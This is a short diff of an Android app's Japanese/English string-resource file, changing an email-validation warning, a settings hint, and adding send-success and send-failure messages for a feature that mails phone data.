@@ -33,7 +33,7 @@
     
     <string name="pref_mail_key">pref_mail</string>
     <string name="pref_mail_title">メール</string>
-    <string name="pref_pls_input_mail">間違うメールアドレス：{0}</string>
+    <string name="pref_pls_input_mail">警告：%s は間違うメールアドレス</string>
     <string name="pref_info_interval_key">pref_info_interval</string> 
     <string name="pref_info_interval_title">間隔</string> <!-- days -->
     <string name="pref_info_interval_dlg_title">取り間隔</string>
@@ -45,7 +45,11 @@
     <string name="init_btn_hide">戻る</string>
     <string name="init_hint_getinfo">Get phonecall, SMS, contact information and send a mail</string>
     <string name="init_hint_screenshot">Get a screenshot and send a mail</string>
-    <string name="init_hint_setting">Set username, serial number, mail address and interval</string>
+    <string name="init_hint_setting">Set mail address and interval</string>
     <string name="init_hint_hide">Exit current setting dialog</string>
+    
+    <!-- Actions -->
+    <string name="action_send_mail_success">送信成功</string>
+    <string name="action_send_mail_fail">送信失敗</string>
     
 </resources>
